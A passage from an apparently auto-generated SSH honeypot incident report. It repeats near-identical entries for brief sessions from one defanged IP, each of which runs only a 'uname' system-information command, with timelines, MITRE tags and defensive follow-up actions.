| `2026-09-27 12:58:26` | `cowrie.log.closed` |
| `2026-09-27 12:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e8f9c96858

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:29` | `cowrie.session.connect` |
| `2026-09-27 12:58:29` | `cowrie.client.version` |
| `2026-09-27 12:58:29` | `cowrie.client.kex` |
| `2026-09-27 12:58:30` | `cowrie.login.success` |
| `2026-09-27 12:58:30` | `cowrie.session.params` |
| `2026-09-27 12:58:30` | `cowrie.command.input` |
| `2026-09-27 12:58:31` | `cowrie.log.closed` |
| `2026-09-27 12:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1031b45a108a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:34` | `cowrie.session.connect` |
| `2026-09-27 12:58:34` | `cowrie.client.version` |
| `2026-09-27 12:58:34` | `cowrie.client.kex` |
| `2026-09-27 12:58:35` | `cowrie.login.success` |
| `2026-09-27 12:58:35` | `cowrie.session.params` |
| `2026-09-27 12:58:35` | `cowrie.command.input` |
| `2026-09-27 12:58:35` | `cowrie.log.closed` |
| `2026-09-27 12:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187806fb8563

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:39` | `cowrie.session.connect` |
| `2026-09-27 12:58:39` | `cowrie.client.version` |
| `2026-09-27 12:58:39` | `cowrie.client.kex` |
| `2026-09-27 12:58:39` | `cowrie.login.success` |
| `2026-09-27 12:58:40` | `cowrie.session.params` |
| `2026-09-27 12:58:40` | `cowrie.command.input` |
| `2026-09-27 12:58:40` | `cowrie.log.closed` |
| `2026-09-27 12:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73fc19ab584b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:44` | `cowrie.session.connect` |
| `2026-09-27 12:58:44` | `cowrie.client.version` |
| `2026-09-27 12:58:44` | `cowrie.client.kex` |
| `2026-09-27 12:58:45` | `cowrie.login.success` |
| `2026-09-27 12:58:45` | `cowrie.session.params` |
| `2026-09-27 12:58:45` | `cowrie.command.input` |
| `2026-09-27 12:58:45` | `cowrie.log.closed` |
| `2026-09-27 12:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9675beb8cba3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:49` | `cowrie.session.connect` |
| `2026-09-27 12:58:49` | `cowrie.client.version` |
| `2026-09-27 12:58:49` | `cowrie.client.kex` |
| `2026-09-27 12:58:50` | `cowrie.login.success` |
| `2026-09-27 12:58:51` | `cowrie.session.params` |
| `2026-09-27 12:58:51` | `cowrie.command.input` |
| `2026-09-27 12:58:51` | `cowrie.log.closed` |
| `2026-09-27 12:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfeab80bc568

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:54` | `cowrie.session.connect` |
| `2026-09-27 12:58:54` | `cowrie.client.version` |
| `2026-09-27 12:58:54` | `cowrie.client.kex` |
| `2026-09-27 12:58:55` | `cowrie.login.success` |
| `2026-09-27 12:58:56` | `cowrie.session.params` |
| `2026-09-27 12:58:56` | `cowrie.command.input` |
| `2026-09-27 12:58:56` | `cowrie.log.closed` |
| `2026-09-27 12:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6188e42e4137

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:58 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:58:59` | `cowrie.session.connect` |
| `2026-09-27 12:58:59` | `cowrie.client.version` |
| `2026-09-27 12:58:59` | `cowrie.client.kex` |
| `2026-09-27 12:58:59` | `cowrie.login.success` |
| `2026-09-27 12:59:00` | `cowrie.session.params` |
| `2026-09-27 12:59:00` | `cowrie.command.input` |
| `2026-09-27 12:59:00` | `cowrie.log.closed` |
| `2026-09-27 12:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fa124dd0a6c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:04` | `cowrie.session.connect` |
| `2026-09-27 12:59:04` | `cowrie.client.version` |
| `2026-09-27 12:59:04` | `cowrie.client.kex` |
| `2026-09-27 12:59:04` | `cowrie.login.success` |
| `2026-09-27 12:59:05` | `cowrie.session.params` |
| `2026-09-27 12:59:05` | `cowrie.command.input` |
| `2026-09-27 12:59:05` | `cowrie.log.closed` |
| `2026-09-27 12:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b42eb50bf58

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:09` | `cowrie.session.connect` |
| `2026-09-27 12:59:09` | `cowrie.client.version` |
| `2026-09-27 12:59:09` | `cowrie.client.kex` |
| `2026-09-27 12:59:09` | `cowrie.login.success` |
| `2026-09-27 12:59:10` | `cowrie.session.params` |
| `2026-09-27 12:59:10` | `cowrie.command.input` |
| `2026-09-27 12:59:10` | `cowrie.log.closed` |
| `2026-09-27 12:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c46824a2709

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:14` | `cowrie.session.connect` |
| `2026-09-27 12:59:14` | `cowrie.client.version` |
| `2026-09-27 12:59:14` | `cowrie.client.kex` |
| `2026-09-27 12:59:14` | `cowrie.login.success` |
| `2026-09-27 12:59:15` | `cowrie.session.params` |
| `2026-09-27 12:59:15` | `cowrie.command.input` |
| `2026-09-27 12:59:15` | `cowrie.log.closed` |
| `2026-09-27 12:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13c136e94e6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:19` | `cowrie.session.connect` |
| `2026-09-27 12:59:19` | `cowrie.client.version` |
| `2026-09-27 12:59:19` | `cowrie.client.kex` |
| `2026-09-27 12:59:19` | `cowrie.login.success` |
| `2026-09-27 12:59:20` | `cowrie.session.params` |
| `2026-09-27 12:59:20` | `cowrie.command.input` |
| `2026-09-27 12:59:20` | `cowrie.log.closed` |
| `2026-09-27 12:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9f4bcdcf99

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:24` | `cowrie.session.connect` |
| `2026-09-27 12:59:24` | `cowrie.client.version` |
| `2026-09-27 12:59:24` | `cowrie.client.kex` |
| `2026-09-27 12:59:24` | `cowrie.login.success` |
| `2026-09-27 12:59:25` | `cowrie.session.params` |
| `2026-09-27 12:59:25` | `cowrie.command.input` |
| `2026-09-27 12:59:25` | `cowrie.log.closed` |
| `2026-09-27 12:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2200086223

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:29` | `cowrie.session.connect` |
| `2026-09-27 12:59:29` | `cowrie.client.version` |
| `2026-09-27 12:59:29` | `cowrie.client.kex` |
| `2026-09-27 12:59:29` | `cowrie.login.success` |
| `2026-09-27 12:59:30` | `cowrie.session.params` |
| `2026-09-27 12:59:30` | `cowrie.command.input` |
| `2026-09-27 12:59:30` | `cowrie.log.closed` |
| `2026-09-27 12:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e33ccaf9d1f0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:33` | `cowrie.session.connect` |
| `2026-09-27 12:59:33` | `cowrie.client.version` |
| `2026-09-27 12:59:34` | `cowrie.client.kex` |
| `2026-09-27 12:59:34` | `cowrie.login.success` |
| `2026-09-27 12:59:35` | `cowrie.session.params` |
| `2026-09-27 12:59:35` | `cowrie.command.input` |
| `2026-09-27 12:59:35` | `cowrie.log.closed` |
| `2026-09-27 12:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40ae2c04d331

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:39` | `cowrie.session.connect` |
| `2026-09-27 12:59:39` | `cowrie.client.version` |
| `2026-09-27 12:59:40` | `cowrie.client.kex` |
| `2026-09-27 12:59:40` | `cowrie.login.success` |
| `2026-09-27 12:59:41` | `cowrie.session.params` |
| `2026-09-27 12:59:41` | `cowrie.command.input` |
| `2026-09-27 12:59:41` | `cowrie.log.closed` |
| `2026-09-27 12:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57306dd13ab8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:43` | `cowrie.session.connect` |
| `2026-09-27 12:59:43` | `cowrie.client.version` |
| `2026-09-27 12:59:43` | `cowrie.client.kex` |
| `2026-09-27 12:59:43` | `cowrie.login.success` |
| `2026-09-27 12:59:44` | `cowrie.session.params` |
| `2026-09-27 12:59:44` | `cowrie.command.input` |
| `2026-09-27 12:59:45` | `cowrie.log.closed` |
| `2026-09-27 12:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645550363d97

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:48` | `cowrie.session.connect` |
| `2026-09-27 12:59:48` | `cowrie.client.version` |
| `2026-09-27 12:59:48` | `cowrie.client.kex` |
| `2026-09-27 12:59:49` | `cowrie.login.success` |
| `2026-09-27 12:59:50` | `cowrie.session.params` |
| `2026-09-27 12:59:50` | `cowrie.command.input` |
| `2026-09-27 12:59:50` | `cowrie.log.closed` |
| `2026-09-27 12:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb72c6c71fb2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:53` | `cowrie.session.connect` |
| `2026-09-27 12:59:53` | `cowrie.client.version` |
| `2026-09-27 12:59:53` | `cowrie.client.kex` |
| `2026-09-27 12:59:54` | `cowrie.login.success` |
| `2026-09-27 12:59:54` | `cowrie.session.params` |
| `2026-09-27 12:59:54` | `cowrie.command.input` |
| `2026-09-27 12:59:55` | `cowrie.log.closed` |
| `2026-09-27 12:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70e06fc0029

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 12:59 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 12:59:58` | `cowrie.session.connect` |
| `2026-09-27 12:59:58` | `cowrie.client.version` |
| `2026-09-27 12:59:58` | `cowrie.client.kex` |
| `2026-09-27 12:59:59` | `cowrie.login.success` |
| `2026-09-27 13:00:00` | `cowrie.session.params` |
| `2026-09-27 13:00:00` | `cowrie.command.input` |
| `2026-09-27 13:00:00` | `cowrie.log.closed` |
| `2026-09-27 13:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75c9117d243

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:03` | `cowrie.session.connect` |
| `2026-09-27 13:00:03` | `cowrie.client.version` |
| `2026-09-27 13:00:04` | `cowrie.client.kex` |
| `2026-09-27 13:00:04` | `cowrie.login.success` |
| `2026-09-27 13:00:05` | `cowrie.session.params` |
| `2026-09-27 13:00:05` | `cowrie.command.input` |
| `2026-09-27 13:00:05` | `cowrie.log.closed` |
| `2026-09-27 13:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb695094198f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:09` | `cowrie.session.connect` |
| `2026-09-27 13:00:09` | `cowrie.client.version` |
| `2026-09-27 13:00:09` | `cowrie.client.kex` |
| `2026-09-27 13:00:09` | `cowrie.login.success` |
| `2026-09-27 13:00:10` | `cowrie.session.params` |
| `2026-09-27 13:00:10` | `cowrie.command.input` |
| `2026-09-27 13:00:10` | `cowrie.log.closed` |
| `2026-09-27 13:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5d8321545a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:13` | `cowrie.session.connect` |
| `2026-09-27 13:00:13` | `cowrie.client.version` |
| `2026-09-27 13:00:14` | `cowrie.client.kex` |
| `2026-09-27 13:00:14` | `cowrie.login.success` |
| `2026-09-27 13:00:15` | `cowrie.session.params` |
| `2026-09-27 13:00:15` | `cowrie.command.input` |
| `2026-09-27 13:00:15` | `cowrie.log.closed` |
| `2026-09-27 13:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898f6ddd1ce5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:19` | `cowrie.session.connect` |
| `2026-09-27 13:00:19` | `cowrie.client.version` |
| `2026-09-27 13:00:19` | `cowrie.client.kex` |
| `2026-09-27 13:00:19` | `cowrie.login.success` |
| `2026-09-27 13:00:20` | `cowrie.session.params` |
| `2026-09-27 13:00:20` | `cowrie.command.input` |
| `2026-09-27 13:00:20` | `cowrie.log.closed` |
| `2026-09-27 13:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795b946f0d67

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:23` | `cowrie.session.connect` |
| `2026-09-27 13:00:23` | `cowrie.client.version` |
| `2026-09-27 13:00:23` | `cowrie.client.kex` |
| `2026-09-27 13:00:24` | `cowrie.login.success` |
| `2026-09-27 13:00:25` | `cowrie.session.params` |
| `2026-09-27 13:00:25` | `cowrie.command.input` |
| `2026-09-27 13:00:25` | `cowrie.log.closed` |
| `2026-09-27 13:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0665a64334

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:00:28` | `cowrie.session.connect` |
| `2026-09-27 13:00:28` | `cowrie.client.version` |
| `2026-09-27 13:00:28` | `cowrie.client.kex` |
| `2026-09-27 13:00:29` | `cowrie.login.success` |
| `2026-09-27 13:00:30` | `cowrie.session.params` |
| `2026-09-27 13:00:30` | `cowrie.command.input` |
| `2026-09-27 13:00:30` | `cowrie.log.closed` |
| `2026-09-27 13:00:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb613af41a36

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:00 |
| **Last Seen** | 2026-09-27 13:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

